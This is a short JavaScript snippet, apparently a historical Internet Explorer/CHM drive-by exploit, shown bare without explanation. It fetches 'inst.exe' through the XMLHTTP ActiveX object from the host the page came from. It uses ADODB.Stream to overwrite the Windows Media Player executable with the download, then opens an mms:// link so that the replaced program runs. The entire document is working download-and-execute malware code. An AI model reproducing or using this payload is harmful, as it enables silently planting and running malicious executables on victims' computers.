<script language="javascript">

    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('COUNTER.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = getPath(location.href)+'inst.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 


    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";
    
</script>
